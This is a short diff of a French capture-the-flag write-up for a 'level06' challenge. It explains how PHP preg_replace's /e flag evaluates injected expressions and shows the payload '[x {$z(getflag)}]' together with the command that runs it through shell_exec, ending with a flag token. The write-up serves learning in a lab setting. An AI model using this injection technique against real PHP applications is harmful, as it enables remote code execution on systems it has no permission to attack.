@@ -47,9 +47,9 @@ function y($m) {
 
 - le flag /e permet devaluer/executer une expression apres remplacement. Ce flag constitue une faille de securite car nous pouvons inserer un expression a executer : ici getflag
 
-#echo "[x {$z(getflag)}]" > file
+#echo '[x {$z(getflag)}]' > file
 Nous creons le fichier afin quil corresponde a ce que l'on souhaite executer lors de l'appel a preg_replace y("shell_exec(getflag)")
 
-#./level06 file 'shell_exec'
+#./level06 file shell_exec
 Check flag x Here is your token : wiok45aaoguiboiki2tuin6ub
 
